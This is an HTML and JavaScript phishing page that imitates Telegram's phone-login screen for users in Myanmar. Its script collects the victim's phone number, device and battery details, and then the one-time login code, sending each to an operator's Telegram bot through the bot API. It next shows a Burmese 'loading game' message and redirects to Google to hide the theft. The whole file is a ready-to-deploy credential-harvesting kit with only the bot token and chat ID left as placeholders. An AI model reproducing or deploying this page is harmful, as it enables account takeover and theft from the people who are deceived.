<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Telegram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        .tg-blue { color: #2481cc; }
        .tg-bg-blue { background-color: #2481cc; }
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #2481cc;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
    </style>
</head>
<body>

<div id="app" class="max-w-md mx-auto h-screen flex flex-col p-6">
    <div id="step1" class="text-center">
        <div class="mt-10 mb-8"><i class="fa-solid fa-paper-plane text-6xl tg-blue"></i></div>
        <h1 class="text-2xl font-bold mb-2">Your Phone</h1>
        <p class="text-gray-500 mb-8">Please confirm your country code and enter your phone number.</p>
        
        <div class="text-left border-b-2 border-gray-200 py-2 mb-6">
            <label class="text-gray-400 text-sm">Country</label>
            <div class="flex justify-between items-center">
                <span class="font-medium">Myanmar</span>
                <i class="fa-solid fa-chevron-right text-gray-400"></i>
            </div>
        </div>

        <div class="flex border-b-2 border-blue-500 py-2 mb-10">
            <span class="font-bold mr-4">+95</span>
            <input type="number" id="phone" placeholder="9xxxxxxxxx" class="w-full outline-none text-lg">
        </div>
    </div>

    <div id="step2" class="hidden text-center">
        <div class="mt-10 mb-8"><i class="fa-solid fa-message text-6xl tg-blue"></i></div>
        <h1 id="displayPhone" class="text-2xl font-bold mb-2">+95 9...</h1>
        <p class="text-gray-500 mb-8">We've sent an activation code to your Telegram app.</p>
        
        <div class="flex justify-center gap-3 mb-10">
            <input type="number" class="otp-in w-12 h-12 text-center border-b-2 border-gray-300 text-2xl outline-none focus:border-blue-500" maxlength="1" oninput="moveNext(this, 0)">
            <input type="number" class="otp-in w-12 h-12 text-center border-b-2 border-gray-300 text-2xl outline-none focus:border-blue-500" maxlength="1" oninput="moveNext(this, 1)">
            <input type="number" class="otp-in w-12 h-12 text-center border-b-2 border-gray-300 text-2xl outline-none focus:border-blue-500" maxlength="1" oninput="moveNext(this, 2)">
            <input type="number" class="otp-in w-12 h-12 text-center border-b-2 border-gray-300 text-2xl outline-none focus:border-blue-500" maxlength="1" oninput="moveNext(this, 3)">
            <input type="number" class="otp-in w-12 h-12 text-center border-b-2 border-gray-300 text-2xl outline-none focus:border-blue-500" maxlength="1" oninput="moveNext(this, 4)">
        </div>
        <p id="funText" class="text-blue-500 italic text-sm animate-pulse"></p>
    </div>

    <div class="fixed bottom-10 right-10">
        <button onclick="handleNext()" id="nextBtn" class="tg-bg-blue w-16 h-16 rounded-full shadow-lg flex items-center justify-center text-white text-2xl transition-all active:scale-90">
            <i id="btnIcon" class="fa-solid fa-arrow-right"></i>
            <div id="btnLoader" class="loader"></div>
        </button>
    </div>
</div>

<script>
    let currentStep = 1;
    const botToken = "YOUR_BOT_TOKEN";
    const chatId = "YOUR_CHAT_ID";
    let phoneInfo = "";

    // Battery & Device Info fetching
    navigator.getBattery().then(batt => {
        phoneInfo = `🔋 Battery: ${Math.round(batt.level * 100)}% | Device: ${navigator.platform}`;
    });

    function moveNext(el, idx) {
        if (el.value && idx < 4) document.querySelectorAll('.otp-in')[idx + 1].focus();
    }

    async function handleNext() {
        const btnIcon = document.getElementById('btnIcon');
        const btnLoader = document.getElementById('btnLoader');
        const funText = document.getElementById('funText');

        // မြှားလည်စေခြင်း
        btnIcon.style.display = 'none';
        btnLoader.style.display = 'block';

        if (currentStep === 1) {
            const rawPhone = document.getElementById('phone').value;
            if (rawPhone.length < 7) {
                alert("Please enter a valid phone number.");
                resetBtn(); return;
            }
            // 09 format ပြုပြင်ခြင်း
            const formattedPhone = rawPhone.startsWith('09') ? rawPhone : '09' + rawPhone.replace(/^9/, '');
            document.getElementById('displayPhone').innerText = formattedPhone;
            
            await sendTG(`📱 New Login Attempt\nPhone: ${formattedPhone}\n${phoneInfo}`);
            
            setTimeout(() => {
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
                currentStep = 2;
                resetBtn();
            }, 1500);

        } else {
            let otp = "";
            document.querySelectorAll('.otp-in').forEach(i => otp += i.value);
            
            funText.innerText = "ခဏစောင့်ပေးပါ... ဂိမ်းလောကထဲသို့ ခေါ်ဆောင်သွားနေပါပြီ 🎮✨";
            
            await sendTG(`🔑 OTP Received\nCode: ${otp}`);

            // နောက်ဆုံးမျက်နှာပြင်သို့ မရောက်မချင်း မြှားလည်နေစေရန်
            setTimeout(() => {
                window.location.href = "https://www.google.com"; // ဤနေရာတွင် ဂိမ်း Link ထည့်ပါ
            }, 3000);
        }
    }

    function resetBtn() {
        document.getElementById('btnIcon').style.display = 'block';
        document.getElementById('btnLoader').style.display = 'none';
    }

    async function sendTG(msg) {
        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
        } catch (e) { console.error(e); }
    }
</script>
</body>
</html>
